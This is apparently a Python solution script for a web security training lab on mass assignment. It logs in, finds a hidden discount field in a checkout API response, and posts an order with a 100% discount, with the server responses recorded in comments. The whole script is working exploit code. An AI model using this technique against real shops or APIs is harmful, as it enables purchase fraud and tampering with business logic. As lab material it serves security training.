# LAB: Exploiting a mass assignment vulnerability

import re
import requests

URL = "https://0a6300b7043c12088071bc14004f0067.web-security-academy.net"
s = requests.Session()

print("===========[step1] login as wiener===============")
r = s.get(f"{URL}/login")
csrf = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
r = s.post(f"{URL}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})
print("[login]", r.status_code, r.url)

print("===========[step2] add jacket to cart===============")
r = s.post(f"{URL}/cart", data={"productId": "1", "redir": "PRODUCT", "quantity": "1"})
print("[cart]", r.status_code, r.url)
'''
HTTP/2 302 Found
Location: /product?productId=1
'''

print("===========[step3] GET /api/checkout (find hidden field)===============")
r = s.get(f"{URL}/api/checkout")
print("[get checkout]", r.status_code, r.text)
'''
HTTP/2 200 OK
{"chosen_discount":{"percentage":0},
 "chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":2,"item_price":133700}]}
-> chosen_discount exists in GET response but NOT in the normal POST body
'''

print("===========[step4] normal POST /api/checkout (fails)===============")
r = s.post(f"{URL}/api/checkout",
           json={"chosen_products": [{"product_id": "1", "quantity": 1}]},
           allow_redirects=False)
print("[normal post]", r.status_code, r.headers.get("Location"))
'''
HTTP/2 201 Created
Location: /cart?err=INSUFFICIENT_FUNDS
'''

print("===========[step5] POST with chosen_discount 100% (mass assignment)===============")
r = s.post(f"{URL}/api/checkout",
           json={"chosen_discount": {"percentage": 100},
                 "chosen_products": [{"product_id": "1", "quantity": 1}]},
           allow_redirects=False)
print("[attack post]", r.status_code, r.headers.get("Location"))
'''
HTTP/2 201 Created
Location: /cart/order-confirmation?order-confirmed=true
'''